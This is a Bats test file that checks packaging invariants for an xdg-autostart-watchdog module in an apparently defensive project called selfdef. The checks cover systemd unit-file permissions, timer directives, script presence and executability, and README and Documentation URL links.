@test "INVARIANT (xdg-autostart-watchdog timer unit file mode is 0644 — systemd unit-file mode convention)" {
    # Sister to brain-wide systemd unit-file mode INVARIANT
    # family. systemd unit files MUST be chmod 0644 (world-
    # readable + root-write-only). Locks the timer unit-file
    # mode discipline.
    timer_dir="${BATS_TEST_DIRNAME}/../../modules/xdg-autostart-watchdog/systemd"
    for t in "${timer_dir}"/*.timer; do
        [ -f "${t}" ] || continue
        m=$(stat -c '%a' "${t}")
        [ "${m}" = "644" ]
    done
}

@test "INVARIANT (xdg-autostart-watchdog timer unit declares Persistent= directive — boot-catchup-policy contract)" {
    # Sister to brain-wide systemd timer Persistent= INVARIANT
    # family.
    timer_dir="${BATS_TEST_DIRNAME}/../../modules/xdg-autostart-watchdog/systemd"
    for t in "${timer_dir}"/*.timer; do
        [ -f "${t}" ] || continue
        grep -qE '^Persistent=' "${t}"
    done
}

@test "INVARIANT (xdg-autostart-watchdog .sh script file exists in module systemd/ dir — ExecStart-target source-of-truth contract)" {
    # Sister to brain-wide ExecStart-target INVARIANT family.
    # The watchdog .service's ExecStart points at
    # /usr/local/libexec/selfdef/<slug>-watchdog.sh which is
    # the runtime install path; the source of truth lives at
    # modules/<slug>-watchdog/systemd/<slug>-watchdog.sh.
    # A regression that lost the script file would break
    # the cargo-deb manifest install + leave ExecStart
    # dangling. Locks the source-script-exists discipline
    # on the xdg-autostart-watchdog substrate.
    script_dir="${BATS_TEST_DIRNAME}/../../modules/xdg-autostart-watchdog/systemd"
    [ -f "${script_dir}/xdg-autostart-watchdog.sh" ] ||     [ -n "$(ls "${script_dir}"/*.sh 2>/dev/null)" ]
}

@test "INVARIANT (xdg-autostart-watchdog timer's Unit= field references a .service in the same module dir — co-located unit-pair binding contract)" {
    # Sister to brain-wide timer Unit= INVARIANT family.
    timer_dir="${BATS_TEST_DIRNAME}/../../modules/xdg-autostart-watchdog/systemd"
    for t in "${timer_dir}"/*.timer; do
        [ -f "${t}" ] || continue
        unit=$(grep -E '^Unit=' "${t}" | head -1 | cut -d= -f2)
        [ -n "${unit}" ]
        [ -f "${timer_dir}/${unit}" ]
    done
}

@test "INVARIANT (xdg-autostart-watchdog .sh script is executable (mode includes +x) — script-runnable contract)" {
    # Sister to brain-wide script-executable INVARIANT family.
    # The watchdog .sh script MUST be chmod +x so systemd's
    # ExecStart can invoke it without needing a bash prefix.
    script_dir="${BATS_TEST_DIRNAME}/../../modules/xdg-autostart-watchdog/systemd"
    for s in "${script_dir}"/*.sh; do
        [ -f "${s}" ] || continue
        [ -x "${s}" ]
    done
}

@test "INVARIANT (xdg-autostart-watchdog README.md exists in module dir — operator-doc-trail contract)" {
    # Sister to brain-wide module-doc-trail INVARIANT family.
    # Every watchdog module ships a README.md documenting its
    # probe target + alert semantics + remediation. A
    # regression that lost the README would leave operators
    # without per-module ops docs.
    readme="${BATS_TEST_DIRNAME}/../../modules/xdg-autostart-watchdog/README.md"
    [ -f "${readme}" ]
}

@test "INVARIANT (xdg-autostart-watchdog service Documentation URL references github.com/cyberpunk042/selfdef — canonical-vcs operator-doc-resolve contract)" {
    # Sister to brain-wide Documentation URL canonical INVARIANT
    # family. The Documentation= URL MUST reference the github
    # repo + module README path so operators can resolve docs
    # offline (via git checkout) or online (via github browser).
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/xdg-autostart-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^Documentation=.*github.com/cyberpunk042/selfdef' "${s}"
    done
}
